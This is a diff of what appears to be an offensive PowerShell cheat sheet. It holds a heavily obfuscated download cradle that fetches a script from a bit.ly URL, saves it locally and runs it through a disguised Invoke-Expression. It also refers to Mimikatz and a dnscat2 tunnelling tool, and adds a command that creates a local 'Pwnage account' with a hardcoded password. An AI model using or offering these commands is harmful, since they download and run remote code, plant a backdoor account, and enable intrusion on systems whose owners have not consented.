@@ -26,7 +26,7 @@ Minor obfuscation:
 
 All obfuscation:
 
-   Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+    Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
 
 Mimikatz - Cradlecraft PsSendKeys
 
@@ -172,3 +172,17 @@ https://gist.github.com/curi0usJack/adbf34bd402f28138388bd6e266da961
 ### DNScat2-powershell
 
 https://github.com/lukebaggett/dnscat2-powershell
+
+# Powershell 5.1
+
+The following requires Powershell 5.1: https://www.microsoft.com/en-us/download/details.aspx?id=54616
+
+Moar fun here: https://4sysops.com/archives/the-new-local-user-and-group-cmdlets-in-powershell-5-1/
+
+## Add User
+
+    New-LocalUser -FullName 'Jack Frost' -Name 'Jackfro' -Password PwnDiddy1 ‑Description 'Pwnage account'
+
+## Create a group
+
+    New-LocalGroup -Name 'Testgroup' -Description 'Testing group'
